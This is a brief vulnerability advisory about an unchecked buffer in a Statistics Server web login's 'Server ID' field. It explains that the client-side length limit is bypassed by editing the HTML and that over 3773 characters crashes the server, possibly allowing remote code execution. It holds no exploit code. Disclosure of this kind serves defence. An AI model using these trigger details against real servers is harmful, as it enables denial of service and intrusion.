The web interface for Statistics Server contains an unchecked buffer which accepts input from the "Server ID" field of the login webpage. While the login webpage has a 16 character restriction, this is easily circumventible by editing the HTML to remove the restriction. Entering a string of more than 3773 characters will crash the server. This bug could potentially be used to remotely execute arbitrary code.
